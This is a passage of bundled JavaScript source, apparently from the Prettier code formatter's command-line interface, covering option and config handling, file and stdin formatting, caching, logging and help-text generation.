function createApiDetailedOptionMap(detailedOptions) {
  return Object.fromEntries(
    detailedOptions.filter(
      (option) => option.forwardToApi && option.forwardToApi !== option.name
    ).map((option) => [option.forwardToApi, option])
  );
}
function parseArgsToOptions(context, overrideDefaults) {
  const minimistOptions = createMinimistOptions(context.detailedOptions);
  const apiDetailedOptionMap = createApiDetailedOptionMap(
    context.detailedOptions
  );
  return getOptions(
    normalize_cli_options_default(
      minimistParse(context.rawArguments, {
        string: minimistOptions.string,
        boolean: minimistOptions.boolean,
        default: cliifyOptions(overrideDefaults, apiDetailedOptionMap)
      }),
      context.detailedOptions,
      { logger: false }
    ),
    context.detailedOptions
  );
}
async function getOptionsOrDie(context, filePath) {
  try {
    if (context.argv.config === false) {
      context.logger.debug(
        "'--no-config' option found, skip loading config file."
      );
      return null;
    }
    context.logger.debug(
      context.argv.config ? `load config file from '${context.argv.config}'` : `resolve config from '${filePath}'`
    );
    const options = await resolveConfig(filePath, {
      editorconfig: context.argv.editorconfig,
      config: context.argv.config
    });
    context.logger.debug("loaded options `" + JSON.stringify(options) + "`");
    return options;
  } catch (error) {
    context.logger.error(
      `Invalid configuration${filePath ? ` for file "${filePath}"` : ""}:
` + error.message
    );
    process.exit(2);
  }
}
function applyConfigPrecedence(context, options) {
  try {
    switch (context.argv.configPrecedence) {
      case "cli-override":
        return parseArgsToOptions(context, options);
      case "file-override":
        return { ...parseArgsToOptions(context), ...options };
      case "prefer-file":
        return options || parseArgsToOptions(context);
    }
  } catch (error) {
    context.logger.error(error.toString());
    process.exit(2);
  }
}
async function getOptionsForFile(context, filepath) {
  const options = await getOptionsOrDie(context, filepath);
  const hasPlugins = options?.plugins;
  if (hasPlugins) {
    await context.pushContextPlugins(options.plugins);
  }
  const appliedOptions = {
    filepath,
    ...applyConfigPrecedence(
      context,
      options && normalizeOptions(options, context.supportOptions, {
        logger: context.logger
      })
    )
  };
  context.logger.debug(
    `applied config-precedence (${context.argv.configPrecedence}): ${JSON.stringify(appliedOptions)}`
  );
  if (hasPlugins) {
    context.popContextPlugins();
  }
  return appliedOptions;
}
var get_options_for_file_default = getOptionsForFile;

// src/cli/format.js
function diff(a, b) {
  return createTwoFilesPatch("", "", a, b, "", "", { context: 2 });
}
var DebugError = class extends Error {
  name = "DebugError";
};
function handleError(context, filename, error, printedFilename, ignoreUnknown) {
  ignoreUnknown ||= context.argv.ignoreUnknown;
  const errorIsUndefinedParseError = error instanceof errors.UndefinedParserError;
  if (errorIsUndefinedParseError && ignoreUnknown) {
    printedFilename?.clear();
    return true;
  }
  if (printedFilename) {
    process.stdout.write("\n");
  }
  if (errorIsUndefinedParseError) {
    context.logger.error(error.message);
    process.exitCode = 2;
    return;
  }
  const isParseError = Boolean(error?.loc);
  const isValidationError = /^Invalid \S+ value\./u.test(error?.message);
  if (isParseError) {
    context.logger.error(`${filename}: ${String(error)}`);
  } else if (isValidationError || error instanceof errors.ConfigError) {
    context.logger.error(error.message);
    process.exit(1);
  } else if (error instanceof DebugError) {
    context.logger.error(`${filename}: ${error.message}`);
  } else {
    context.logger.error(filename + ": " + (error.stack || error));
  }
  process.exitCode = 2;
}
function writeOutput(context, result, options) {
  process.stdout.write(
    context.argv.debugCheck ? result.filepath : result.formatted
  );
  if (options && options.cursorOffset >= 0) {
    process.stderr.write(result.cursorOffset + "\n");
  }
}
async function listDifferent(context, input, options, filename) {
  if (!context.argv.check && !context.argv.listDifferent) {
    return;
  }
  try {
    if (!await prettier.check(input, options) && !context.argv.write) {
      context.logger.log(filename);
      process.exitCode = 1;
    }
  } catch (error) {
    context.logger.error(error.message);
  }
  return true;
}
async function format3(context, input, opt) {
  if (context.argv.debugPrintDoc) {
    const doc = await prettier.__debug.printToDoc(input, opt);
    return { formatted: await prettier.__debug.formatDoc(doc) + "\n" };
  }
  if (context.argv.debugPrintComments) {
    return {
      formatted: await prettier.format(
        JSON.stringify(
          (await prettier.formatWithCursor(input, opt)).comments || []
        ),
        { parser: "json" }
      )
    };
  }
  if (context.argv.debugPrintAst) {
    const { ast } = await prettier.__debug.parse(input, opt);
    return {
      formatted: JSON.stringify(ast)
    };
  }
  if (context.argv.debugCheck) {
    const pp = await prettier.format(input, opt);
    const pppp = await prettier.format(pp, opt);
    if (pp !== pppp) {
      throw new DebugError(
        "prettier(input) !== prettier(prettier(input))\n" + diff(pp, pppp)
      );
    } else {
      const stringify5 = (obj) => JSON.stringify(obj, null, 2);
      const ast = stringify5(
        (await prettier.__debug.parse(input, opt, { massage: true })).ast
      );
      const past = stringify5(
        (await prettier.__debug.parse(pp, opt, { massage: true })).ast
      );
      if (ast !== past) {
        const MAX_AST_SIZE = 2097152;
        const astDiff = ast.length > MAX_AST_SIZE || past.length > MAX_AST_SIZE ? "AST diff too large to render" : diff(ast, past);
        throw new DebugError(
          "ast(input) !== ast(prettier(input))\n" + astDiff + "\n" + diff(input, pp)
        );
      }
    }
    return { formatted: pp, filepath: opt.filepath || "(stdin)\n" };
  }
  const { performanceTestFlag } = context;
  if (performanceTestFlag?.debugBenchmark) {
    let Bench;
    try {
      ({ Bench } = await import("tinybench"));
    } catch {
      context.logger.debug(
        "'--debug-benchmark' requires the 'tinybench' package to be installed."
      );
      process.exit(2);
    }
    context.logger.debug(
      "'--debug-benchmark' option found, measuring formatWithCursor with 'tinybench' module."
    );
    const bench = new Bench();
    bench.add("Format", () => prettier.formatWithCursor(input, opt));
    await bench.run();
    const [result] = bench.table();
    context.logger.debug(
      "'--debug-benchmark' measurements for formatWithCursor: " + JSON.stringify(result, void 0, 2)
    );
  } else if (performanceTestFlag?.debugRepeat) {
    const repeat = performanceTestFlag.debugRepeat;
    context.logger.debug(
      `'${performanceTestFlag.name}' found, running formatWithCursor ${repeat} times.`
    );
    const start = mockable_default.getTimestamp();
    for (let i = 0; i < repeat; ++i) {
      await prettier.formatWithCursor(input, opt);
    }
    const averageMs = (mockable_default.getTimestamp() - start) / repeat;
    const results = {
      repeat,
      hz: 1e3 / averageMs,
      ms: averageMs
    };
    context.logger.debug(
      `'${performanceTestFlag.name}' measurements for formatWithCursor: ${JSON.stringify(
        results,
        null,
        2
      )}`
    );
  }
  return prettier.formatWithCursor(input, opt);
}
async function createIsIgnoredFromContextOrDie(context) {
  try {
    return await createIsIgnoredFunction(
      context.argv.ignorePath,
      context.argv.withNodeModules
    );
  } catch (e) {
    context.logger.error(e.message);
    process.exit(2);
  }
}
async function formatStdin(context) {
  const { filepath } = context.argv;
  try {
    const input = await getStdin();
    const absoluteFilepath = filepath ? path12.resolve(filepath) : void 0;
    let isFileIgnored = false;
    if (absoluteFilepath) {
      const isIgnored = await createIsIgnoredFromContextOrDie(context);
      isFileIgnored = isIgnored(absoluteFilepath);
    }
    if (isFileIgnored) {
      writeOutput(context, { formatted: input });
      return;
    }
    const options = {
      ...await get_options_for_file_default(context, absoluteFilepath),
      // `getOptionsForFile` forwards `--stdin-filepath` directly, which can be a relative path
      filepath: absoluteFilepath
    };
    if (await listDifferent(context, input, options, "(stdin)")) {
      return;
    }
    const formatted = await format3(context, input, options);
    const { performanceTestFlag } = context;
    if (performanceTestFlag) {
      context.logger.log(
        `'${performanceTestFlag.name}' option found, skipped print code to screen.`
      );
      return;
    }
    writeOutput(context, formatted, options);
  } catch (error) {
    handleError(context, filepath || "stdin", error);
  }
}
async function formatFiles(context) {
  const isIgnored = await createIsIgnoredFromContextOrDie(context);
  const cwd3 = process.cwd();
  let numberOfUnformattedFilesFound = 0;
  let numberOfFilesWithError = 0;
  const { performanceTestFlag } = context;
  if (context.argv.check && !performanceTestFlag) {
    context.logger.log("Checking formatting...");
  }
  let formatResultsCache;
  const cacheFilePath = await find_cache_file_default(context.argv.cacheLocation);
  if (context.argv.cache) {
    formatResultsCache = new format_results_cache_default(
      cacheFilePath,
      context.argv.cacheStrategy || "content"
    );
  } else if (!context.argv.cacheLocation) {
    const stat = await statSafe(cacheFilePath);
    if (stat) {
      await fs9.unlink(cacheFilePath);
    }
  }
  const isTTY = mockable_default.isStreamTTY(process.stdout) && !mockable_default.isCI();
  for await (const { error, filename, ignoreUnknown } of expandPatterns(
    context
  )) {
    if (error) {
      context.logger.error(error);
      process.exitCode = 2;
      continue;
    }
    const isFileIgnored = isIgnored(filename);
    if (isFileIgnored && (context.argv.debugCheck || context.argv.write || context.argv.check || context.argv.listDifferent)) {
      continue;
    }
    const options = {
      ...await get_options_for_file_default(context, filename),
      filepath: filename
    };
    const fileNameToDisplay = normalizeToPosix(path12.relative(cwd3, filename));
    let printedFilename;
    if (isTTY) {
      printedFilename = context.logger.log(fileNameToDisplay, {
        newline: false,
        clearable: true
      });
    }
    let input;
    try {
      input = await fs9.readFile(filename, "utf8");
    } catch (error2) {
      context.logger.log("");
      context.logger.error(
        `Unable to read file "${fileNameToDisplay}":
${error2.message}`
      );
      process.exitCode = 2;
      continue;
    }
    if (isFileIgnored) {
      printedFilename?.clear();
      writeOutput(context, { formatted: input }, options);
      continue;
    }
    const start = mockable_default.getTimestamp();
    const isCacheExists = formatResultsCache?.existsAvailableFormatResultsCache(
      filename,
      options
    );
    let result;
    let output;
    try {
      if (isCacheExists) {
        result = { formatted: input };
      } else {
        result = await format3(context, input, options);
      }
      output = result.formatted;
    } catch (error2) {
      const errorIsIgnored = handleError(
        context,
        fileNameToDisplay,
        error2,
        printedFilename,
        ignoreUnknown
      );
      if (!errorIsIgnored) {
        numberOfFilesWithError += 1;
      }
      continue;
    }
    const isDifferent = output !== input;
    let shouldSetCache = !isDifferent;
    printedFilename?.clear();
    if (performanceTestFlag) {
      context.logger.log(
        `'${performanceTestFlag.name}' option found, skipped print code or write files.`
      );
      return;
    }
    if (context.argv.write) {
      const timeToDisplay = `${Math.round(mockable_default.getTimestamp() - start)}ms`;
      if (isDifferent) {
        if (!context.argv.check && !context.argv.listDifferent) {
          context.logger.log(`${fileNameToDisplay} ${timeToDisplay}`);
        }
        try {
          await mockable_default.writeFormattedFile(filename, output);
          shouldSetCache = true;
        } catch (error2) {
          context.logger.error(
            `Unable to write file "${fileNameToDisplay}":
${error2.message}`
          );
          process.exitCode = 2;
        }
      } else if (!context.argv.check && !context.argv.listDifferent) {
        const message = `${picocolors.gray(fileNameToDisplay)} ${timeToDisplay} (unchanged)`;
        if (isCacheExists) {
          context.logger.log(`${message} (cached)`);
        } else {
          context.logger.log(message);
        }
      }
    } else if (context.argv.debugCheck) {
      if (result.filepath) {
        context.logger.log(fileNameToDisplay);
      } else {
        process.exitCode = 2;
      }
    } else if (!context.argv.check && !context.argv.listDifferent) {
      writeOutput(context, result, options);
    }
    if (shouldSetCache) {
      formatResultsCache?.setFormatResultsCache(filename, options);
    } else {
      formatResultsCache?.removeFormatResultsCache(filename);
    }
    if (isDifferent) {
      if (context.argv.check) {
        context.logger.warn(fileNameToDisplay);
      } else if (context.argv.listDifferent) {
        context.logger.log(fileNameToDisplay);
      }
      numberOfUnformattedFilesFound += 1;
    }
  }
  formatResultsCache?.reconcile();
  if (context.argv.check) {
    if (numberOfFilesWithError > 0) {
      const files = numberOfFilesWithError === 1 ? "the above file" : `${numberOfFilesWithError} files`;
      context.logger.log(
        `Error occurred when checking code style in ${files}.`
      );
    } else if (numberOfUnformattedFilesFound === 0) {
      context.logger.log("All matched files use Prettier code style!");
    } else {
      const files = numberOfUnformattedFilesFound === 1 ? "the above file" : `${numberOfUnformattedFilesFound} files`;
      context.logger.warn(
        context.argv.write ? `Code style issues fixed in ${files}.` : `Code style issues found in ${files}. Run Prettier with --write to fix.`
      );
    }
  }
  if ((context.argv.check || context.argv.listDifferent) && numberOfUnformattedFilesFound > 0 && !process.exitCode && !context.argv.write) {
    process.exitCode = 1;
  }
}

// src/cli/logger.js
var { argv, env: env2 } = process;
var isStderrColorSupported = !(Boolean(env2.NO_COLOR) || argv.includes("--no-color")) && (Boolean(env2.FORCE_COLOR) || argv.includes("--color") || process.platform === "win32" || process.stderr.isTTY && env2.TERM !== "dumb" || Boolean(env2.CI));
var picocolorsStderr = picocolors.createColors(isStderrColorSupported);
var emptyLogResult = { clear() {
} };
function createLogger(logLevel = "log") {
  return {
    logLevel,
    warn: createLogFunc("warn", "yellow"),
    error: createLogFunc("error", "red"),
    debug: createLogFunc("debug", "blue"),
    log: createLogFunc("log")
  };
  function createLogFunc(loggerName, color) {
    if (!shouldLog(loggerName)) {
      return () => emptyLogResult;
    }
    const stream = process[loggerName === "log" ? "stdout" : "stderr"];
    const colors = loggerName === "log" ? picocolors : picocolorsStderr;
    const prefix = color ? `[${colors[color](loggerName)}] ` : "";
    return (message, options) => {
      options = {
        newline: true,
        clearable: false,
        ...options
      };
      message = string_replace_all_default(
        /* isOptionalObject */
        false,
        message,
        /^/gmu,
        prefix
      ) + (options.newline ? "\n" : "");
      stream.write(message);
      if (options.clearable) {
        return {
          clear: () => mockable_default.clearStreamText(stream, message)
        };
      }
    };
  }
  function shouldLog(loggerName) {
    switch (logLevel) {
      case "silent":
        return false;
      case "debug":
        if (loggerName === "debug") {
          return true;
        }
      // fall through
      case "log":
        if (loggerName === "log") {
          return true;
        }
      // fall through
      case "warn":
        if (loggerName === "warn") {
          return true;
        }
      // fall through
      case "error":
        return loggerName === "error";
    }
  }
}
var logger_default = createLogger;

// src/cli/print-support-info.js
var import_fast_json_stable_stringify3 = __toESM(require_fast_json_stable_stringify(), 1);
import { format as format4, getSupportInfo as getSupportInfo2 } from "../index.mjs";
var sortByName = (array) => array.sort((a, b) => a.name.localeCompare(b.name));
async function printSupportInfo() {
  const { languages, options } = await getSupportInfo2();
  const supportInfo = {
    languages: sortByName(languages),
    options: sortByName(options).map(
      (option) => omit(option, ["cliName", "cliCategory", "cliDescription"])
    )
  };
  const result = await format4((0, import_fast_json_stable_stringify3.default)(supportInfo), { parser: "json" });
  printToScreen(result.trim());
}
var print_support_info_default = printSupportInfo;

// src/cli/constants.evaluate.js
var categoryOrder = [
  "Output",
  "Format",
  "Config",
  "Editor",
  "Other"
];
var usageSummary = "Usage: prettier [options] [file/dir/glob ...]\n\nBy default, output is written to stdout.\nStdin is read if it is piped to Prettier and no files are given.";

// src/cli/usage.js
var OPTION_USAGE_THRESHOLD = 25;
var CHOICE_USAGE_MARGIN = 3;
var CHOICE_USAGE_INDENTATION = 2;
function indent(str, spaces) {
  return string_replace_all_default(
    /* isOptionalObject */
    false,
    str,
    /^/gmu,
    " ".repeat(spaces)
  );
}
function createDefaultValueDisplay(value) {
  return Array.isArray(value) ? `[${value.map(createDefaultValueDisplay).join(", ")}]` : value;
}
function getOptionDefaultValue(context, optionName) {
  const option = context.detailedOptions.find(
    ({ name }) => name === optionName
  );
  if (option?.default !== void 0) {
    return option.default;
  }
  const optionCamelName = camelCase(optionName);
  return formatOptionsHiddenDefaults[optionCamelName] ?? context.supportOptions.find(
    (option2) => !option2.deprecated && option2.name === optionCamelName
  )?.default;
}
function createOptionUsageHeader(option) {
  const name = `--${option.name}`;
  const alias = option.alias ? `-${option.alias},` : null;
  const type = createOptionUsageType(option);
  return [alias, name, type].filter(Boolean).join(" ");
}
function createOptionUsageRow(header, content, threshold) {
  const separator = header.length >= threshold ? `
${" ".repeat(threshold)}` : " ".repeat(threshold - header.length);
  const description = string_replace_all_default(
    /* isOptionalObject */
    false,
    content,
    "\n",
    `
${" ".repeat(threshold)}`
  );
  return `${header}${separator}${description}`;
}
function createOptionUsageType(option) {
  switch (option.type) {
    case "boolean":
      return null;
    case "choice":
      return `<${option.choices.filter((choice) => !choice.deprecated).map((choice) => choice.value).join("|")}>`;
    default:
      return `<${option.type}>`;
  }
}
function createChoiceUsages(choices, margin, indentation) {
  const activeChoices = choices.filter((choice) => !choice.deprecated);
  const threshold = Math.max(0, ...activeChoices.map((choice) => choice.value.length)) + margin;
  return activeChoices.map(
    (choice) => indent(
      createOptionUsageRow(choice.value, choice.description, threshold),
      indentation
    )
  );
}
function createOptionUsage(context, option, threshold) {
  const header = createOptionUsageHeader(option);
  const optionDefaultValue = getOptionDefaultValue(context, option.name);
  return createOptionUsageRow(
    header,
    `${option.description}${optionDefaultValue === void 0 ? "" : `
Defaults to ${createDefaultValueDisplay(optionDefaultValue)}.`}`,
    threshold
  );
}
function getOptionsWithOpposites(options) {
  const optionsWithOpposites = options.map((option) => [
    option.description ? option : null,
    option.oppositeDescription ? {
      ...option,
      name: `no-${option.name}`,
      type: "boolean",
      description: option.oppositeDescription
    } : null
  ]);
  return optionsWithOpposites.flat().filter(Boolean);
}
function createUsage(context) {
  const sortedOptions = context.detailedOptions.sort(
    (optionA, optionB) => optionA.name.localeCompare(optionB.name)
  );
  const options = getOptionsWithOpposites(sortedOptions).filter(
    // remove unnecessary option (e.g. `semi`, `color`, etc.), which is only used for --help <flag>
    (option) => !(option.type === "boolean" && option.oppositeDescription && !option.name.startsWith("no-"))
  );
  const groupedOptions = groupBy(options, (option) => option.category);
  const firstCategories = categoryOrder.slice(0, -1);
  const lastCategories = categoryOrder.slice(-1);
  const restCategories = Object.keys(groupedOptions).filter(
    (category) => !categoryOrder.includes(category)
  );
  const allCategories = [
    ...firstCategories,
    ...restCategories,
    ...lastCategories
  ];
  const optionsUsage = allCategories.map((category) => {
    const categoryOptions = groupedOptions[category].map(
      (option) => createOptionUsage(context, option, OPTION_USAGE_THRESHOLD)
    ).join("\n");
    return `${category} options:

${indent(categoryOptions, 2)}`;
  });
  return [usageSummary, ...optionsUsage, ""].join("\n\n");
}
function createPluginDefaults(pluginDefaults) {
  if (!pluginDefaults || Object.keys(pluginDefaults).length === 0) {
    return "";
  }
  const defaults = Object.entries(pluginDefaults).sort(
    ([pluginNameA], [pluginNameB]) => pluginNameA.localeCompare(pluginNameB)
  ).map(
    ([plugin, value]) => `* ${plugin}: ${createDefaultValueDisplay(value)}`
  ).join("\n");
  return `
Plugin defaults:
${defaults}`;
}
function createDetailedUsage(context, flag) {
  const option = getOptionsWithOpposites(context.detailedOptions).find(
    (option2) => option2.name === flag || option2.alias === flag
  );
  const header = createOptionUsageHeader(option);
  const description = `

${indent(option.description, 2)}`;
  const choices = option.type !== "choice" ? "" : `

Valid options:

${createChoiceUsages(
    option.choices,
    CHOICE_USAGE_MARGIN,
    CHOICE_USAGE_INDENTATION
  ).join("\n")}`;
  const optionDefaultValue = getOptionDefaultValue(context, option.name);
  const defaults = optionDefaultValue !== void 0 ? `

Default: ${createDefaultValueDisplay(optionDefaultValue)}` : "";
  const pluginDefaults = createPluginDefaults(option.pluginDefaults);
  return `${header}${description}${choices}${defaults}${pluginDefaults}`;
}

// src/cli/index.js
async function run(rawArguments = process.argv.slice(2)) {
  let logger = logger_default();
  try {
    const { logLevel } = parseArgvWithoutPlugins(
      rawArguments,
      logger,
      "log-level"
    );
    if (logLevel !== logger.logLevel) {
      logger = logger_default(logLevel);
    }
    const context = new context_default({ rawArguments, logger });
    await context.init();
    if (logger.logLevel !== "debug" && context.performanceTestFlag) {
      context.logger = logger_default("debug");
    }
    await main(context);
  } catch (error) {
    logger.error(error.message);
    process.exitCode = 1;
  }
}
async function main(context) {
  context.logger.debug(`normalized argv: ${JSON.stringify(context.argv)}`);
  if (context.argv.config === false && context.argv.__raw.config !== false || context.argv.config && context.rawArguments.includes("--no-config")) {
    throw new Error("Cannot use --no-config and --config together.");
  }
  if (context.argv.check && context.argv.listDifferent) {
    throw new Error("Cannot use --check and --list-different together.");
  }
  if (context.argv.write && context.argv.debugCheck) {
    throw new Error("Cannot use --write and --debug-check together.");
  }
  if (context.argv.findConfigPath && context.filePatterns.length > 0) {
    throw new Error("Cannot use --find-config-path with multiple files");
  }
  if (context.argv.fileInfo && context.filePatterns.length > 0) {
    throw new Error("Cannot use --file-info with multiple files");
  }
  if (!context.argv.cache && context.argv.cacheStrategy) {
    throw new Error("`--cache-strategy` cannot be used without `--cache`.");
  }
  if (context.argv.version) {
    printToScreen(prettier2.version);
    return;
  }
  if (context.argv.help !== void 0) {
    printToScreen(
      typeof context.argv.help === "string" && context.argv.help !== "" ? createDetailedUsage(context, context.argv.help) : createUsage(context)
    );
    return;
  }
  if (context.argv.supportInfo) {
    return print_support_info_default();
  }
  if (context.argv.findConfigPath) {
    await find_config_path_default(context);
    return;
  }
  if (context.argv.fileInfo) {
    await file_info_default(context);
    return;
  }
  const hasFilePatterns = context.filePatterns.length > 0;
  const useStdin = !hasFilePatterns && (!mockable_default.isStreamTTY(process.stdin) || context.argv.filepath);
  if (useStdin) {
    if (context.argv.cache) {
      throw new Error("`--cache` cannot be used when formatting stdin.");
    }
    await formatStdin(context);
    return;
  }
  if (hasFilePatterns) {
    await formatFiles(context);
    return;
  }
  process.exitCode = 1;
  printToScreen(createUsage(context));
}
export {
  mockable,
  run
};
